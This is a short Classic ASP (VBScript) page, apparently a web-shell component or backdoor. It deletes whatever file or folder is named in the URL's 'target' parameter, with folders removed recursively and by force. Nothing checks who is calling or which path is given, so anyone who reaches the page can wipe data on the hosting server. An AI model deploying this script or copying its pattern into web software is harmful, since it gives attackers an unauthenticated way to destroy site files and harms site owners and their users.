<%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%>
<%
dim fs,f 
set fs=Server.CreateObject("Scripting.FileSystemObject")
if request.QueryString("cod") = "file" then
set f=fs.GetFile(server.MapPath(request.QueryString("target")))
else
set f=fs.GetFolder(server.MapPath(request.QueryString("target")))
end if
f.Delete(true)
set f=nothing
set fs=nothing
%>